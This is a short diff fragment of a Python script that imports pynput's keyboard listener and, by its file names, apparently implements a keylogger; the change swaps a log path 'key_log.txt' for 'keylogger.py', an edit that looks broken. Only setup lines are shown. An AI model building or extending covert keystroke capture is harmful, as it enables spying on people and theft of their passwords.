@@ -1,6 +1,6 @@
 from pynput import keyboard
 
-log_file = "key_log.txt"
+file = "keylogger.py"
 
 def on_press(key):
     try:
